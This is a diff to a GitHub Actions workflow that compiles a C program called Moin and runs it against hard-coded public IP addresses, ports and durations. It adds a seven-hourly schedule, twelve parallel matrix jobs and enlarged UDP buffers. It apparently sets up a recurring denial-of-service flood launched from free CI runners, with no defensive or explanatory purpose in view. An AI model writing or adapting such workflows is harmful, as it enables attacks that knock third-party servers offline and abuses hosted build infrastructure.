@@ -2,16 +2,32 @@ name: Moin
 on:
   push:
   pull_request:
+  schedule:
+    - cron: '0 */7 * * *'
   workflow_dispatch:
 jobs:
   build_and_run:
     runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        job: [1,2,3,4,5,6,7,8,9,10,11,12]
     steps:
-      - name: Checkout
+      - name: Checkout code
         uses: actions/checkout@v3
-      - name: Compile Moin
+
+      - name: Increase system UDP/Memory limits
+        run: |
+          ulimit -f unlimited
+          ulimit -v unlimited
+          ulimit -s unlimited
+          sudo sysctl -w net.core.rmem_max=26214400
+          sudo sysctl -w net.core.wmem_max=26214400
+
+      - name: Compile Moin.c
         run: gcc -o Moin Moin.c -lssl -lcrypto -lpthread
-      - name: Make executable
+
+      - name: Make Moin executable
         run: chmod +x Moin
+
       - name: Run Moin
-        run: ./Moin 98.70.107.243 19260 300
+        run: ./Moin 20.198.111.86 10469 3
